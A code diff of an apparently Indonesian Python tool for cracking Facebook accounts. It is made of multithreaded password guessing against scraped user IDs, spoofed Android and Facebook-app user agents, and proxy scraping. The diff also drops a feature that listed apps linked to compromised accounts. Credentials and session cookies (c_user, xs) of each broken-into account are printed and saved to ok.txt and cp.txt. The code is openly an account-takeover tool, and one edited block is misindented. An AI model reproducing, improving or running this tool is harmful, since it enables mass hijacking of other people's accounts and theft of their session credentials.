@@ -129,21 +129,6 @@ class Login:
             else:pass
         except:pass
 
-    def get_proxy(self):
-        rest = []
-        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
-        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
-        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
-        for x in reg:
-            rest.append("socks5://"+x[0]+":"+x[1])
-        if rest != 0:
-            try:os.remove("proxies.txt")
-            except:pass
-            for yay in rest:
-                open("proxies.txt", "a+").write(yay+"\n")
-            exit("(✓) File save in proxies.txt, restart this tools\n")
-        else:
-            exit("(✓) File save in proxies.txt, restart this tools\n")
             
     def menu(self):
         try:cook = {"cookie": open(".cok.txt", "r").read()};tokz = open(".tok.txt", "r").read()
@@ -249,32 +234,7 @@ N,H,N
             self.hapus()
             exit("done remove cookie")
         else:print("[!] input yang bner kontol");time.sleep(2);self.menu()
-
-    def cek_hasil(self):
-        print("""-----------------------------------------------------
-{01} check result ok
-{02} check result cp
-{00} back to menu
------------------------------------------------------""")
-        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
-        if ykh in ["", " "]:
-            print("[!] jangan kosong");time.sleep(2);self.menu()
-        elif ykh in ["1", "01"]:
-            try: yyy = open("ok.txt", "r").readlines()
-            except FileNotFoundError:print("No ok results saved");time.sleep(2);self.cek_hasil()
-            for i in yyy:
-                print(i)
-            exit("\nCheck result is complete")
-        elif ykh in ["2", "02"]:
-            try: yyy = open("cp.txt", "r").readlines()
-            except FileNotFoundError:print("No cp results saved");time.sleep(2);self.cek_hasil()
-            for i in yyy:
-                print(i)
-            exit("\nCheck result is complete")
-        elif ykh in ["0", "00"]:
-            self.menu()
-        else:print("[!] input yang bnr");time.sleep(2);self.menu()
-
+        
     def dumps(self, link, coki):
         try:
             data = self.ses.get(link, cookies=coki).text
@@ -355,7 +315,7 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
                     with prog:
                         with Modol(max_workers=30) as bool:
                             for user in self.id:
-                                bool.submit(self.kontol_kuda, user.split("<=>")[0], pwek)
+                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                         exit("\n\ncracking done!")
                 elif "acy" in xx:
                     print("""-----------------------------------------------------
@@ -380,16 +340,9 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
                                 bool.submit(self.kontol_kuda, user.split("<=>")[0], pwek, xx)
                         exit("\n\ncracking done!")
                 else:continue
-                
-    def ua_asu(self):
-        with open("/storage/emulated/0/Download/dalvik.txt", "r") as file:
-            allText = file.read()
-            words = list(map(str, allText.split()))
-            asuuu = random.choice(words)
-        return asuuu
 
     def carckk(self, kntd):
-        self.apk()
+
         print("""-----------------------------------------------------
 PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
 -----------------------------------------------------""")
@@ -412,74 +365,22 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
                             for x in self.pasw:
                                 pwx.append(x)
                         if "api" in kntd:
-                            bool.submit(self.kontol_kuda, uid, pwx)
+                            bool.submit(self.apiiiiii, uid, pwx)
                         elif "acy" in kntd:
                             bool.submit(self.kontol_kuda, uid, pwx, kntd)
                         elif "dat" in kntd:
                             bool.submit(self.kontol_kuda, uid, pwx, kntd)
                         elif "mes" in kntd:
-                            bool.submit(self.kontol_kuda, uid, pwx, kntd)
-                        else:bool.submit(self.kontol_kuda, uid, pwx)
+                            bool.submit(self.apiiiiii, uid, pwx, kntd)
+                        else:bool.submit(self.apiiiiii, uid, pwx)
                     except:pass
             exit("\n\ncracking done!")
 
-    def apk(self):
-        kntd = input("[?] tampilkan aplikasi yang terkait [Y/t]: ")
-        if "y" in kntd:self.ya.append("ya")
-        else:self.ya.append("ta")
-
-
-    def cek_apk(self, user, pw, coki):
-        try:
-            link = self.ses.get(self.url+"/", cookies={"cookie": coki}).text
-            if "/zero/optin/write" in str(link):
-                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
-                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": coki}).text
-                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
-                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
-                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": coki}).text
-        except:pass
-        aktif = Tree("")
-        self.ApkAktif(f"{self.url}/settings/apps/tabbed/?tab=active", coki)
-        if len(self.ak)==0:
-            aktif.add("[bold red]Tidak ada apklikasi aktif yang terkait di akun ini")
-        else:
-            for apk in self.ak:
-                aktif.add(apk)
-        kadal = Tree("")
-        self.ApkKadal(f"{self.url}/settings/apps/tabbed/?tab=inactive", coki)
-        if len(self.ka)==0:
-            kadal.add("[bold red]Tidak ada apklikasi aktif yang terkait di akun ini")
-        else:
-            for apk in self.ka:
-                kadal.add(apk)
-        tree = Tree("")
-        tree.add(f"[[bold green]LIVE[/]] {user}|{pw}")
-        tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
-        tree.add("Aplikasi Terkait").add(f"Aktif [bold green]{str(len(self.ak))}[/]").add(aktif)
-        tree.add("").add(f"Kedaluwarsa [bold red]{str(len(self.ka))}[/]").add(kadal)
-        prints(tree)
-
-    def ApkAktif(self, url, cok):
-        try:
-            link = par(self.ses.get(url, cookies={"cookie":cok}).text, "html.parser")
-            for apk in link.find_all("h3"):
-                if "Ditambahkan" in apk.text:
-                    self.ak.append(f"[bold green]{str(apk.text).replace('Ditambahkan','[bold white] - Ditambahkan')}")
-                else:continue
-            self.ApkAktif(self.url+link.find("a", string="Lihat Lainnya")["href"], cok)
-        except:pass
-
-    def ApkKadal(self, url, cok):
-        try:
-            link = par(self.ses.get(url, cookies={"cookie":cok}).text, "html.parser")
-            for apk in link.find_all("h3"):
-                if "Kedaluwarsa" in apk.text:
-                    self.ka.append(f"[bold red]{str(apk.text).replace('Kedaluwarsa','[bold white] - Kedaluwarsa')}")
-                else:continue
-            self.ApkKadal(self.url+link.find("a", string="Lihat Lainnya")["href"], cok)
-        except:pass
-
+    def ua_asu(self):
+        vers = random.randrange(6,13)
+        verq = random.choice(["RMX3472", "RMX3611", "RMX3396", "RMX3572", "RMX3706", "RMX3396", "RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"])
+        xnxx = random.choice(["SP1A.210812.016","TP1A.220905.001","SP1A.210812.016","SP1A.210812.016","TP1A.220905.001","TP1A.220905.001","SP1A.210812.016","RKQ1.210503.001","TP1A.220905.001","RKQ1.211119.001","TP1A.220905.001","TP1A.220905.001","RP1A.201005.001","RP1A.201005.001","RKQ1.211119.001",])
+        return (f"Dalvik/2.1.0 (Linux; U; Android {vers}; {verq} Build/{xnxx}) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/{verq};FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/"+"{density=3.0}]")
 
     def kontol_kuda(self, username, pasw, kntd):
         prog.update(des, description=f"[ <//> ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
@@ -508,27 +409,25 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
                 if "c_user" in ses.cookies.get_dict():
                     cooz = ses.cookies.get_dict()
                     coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
-                    kntlol = username+"|"+password
-                    kntl = kntlol.split("|")
-                    if "ya" in self.ya:self.cek_apk(kntl[0], kntl[1], coki)
-                    else:
-                        tree = Tree("")
-                        tree.add(f"[[bold green]LIVE[/]] {kntl[0]}|{kntl[1]}|{uas}")
-                        tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
+                    kntloj = username+"|"+password
+                    kntl = kntloj.split("|")
+                    tree = Tree("")
+                    tree.add(f"[[bold green]LIVE[/]] {kntl[0]}|{kntl[1]}")
+                    tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
                         prints(tree)
                     self.ok.append(kntl)
                     with open("ok.txt", "a", encoding="utf-8") as r:
-                        r.write(f"[✓] {kntl[0]}|{kntl[1]}|{coki}|{uas}\n")
+                        r.write(f"[✓] {kntl[0]}|{kntl[1]}|{coki}\n")
                     break
                 elif "checkpoint" in ses.cookies.get_dict():
-                    mmksrw = username+"|"+password
-                    mmks = mmksrw.split("|")
+                    mmksos = username+"|"+password
+                    mmks = mmksos.split("|")
                     tree = Tree("")
-                    tree.add(f"[[bold yellow]CHEK[/]] {mmks[0]}|{mmks[1]}|{uas}")
+                    tree.add(f"[[bold yellow]CHEK[/]] {mmks[0]}|{mmks[1]}")
                     prints(tree)
                     self.cp.append(mmks)
                     with open("cp.txt", "a", encoding="utf-8") as r:
-                        r.write(f"[×] {mmks[0]}|{mmks[1]}|{uas}\n")
+                        r.write(f"[×] {mmks[0]}|{mmks[1]}\n")
                     break
             except requests.exceptions.ConnectionError:
                 prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
@@ -536,7 +435,6 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
                 time.sleep(5)
             #except Exception as e:print(e)
         self.lo+=1
-
 
 os.system("clear")
 os.system("git pull")
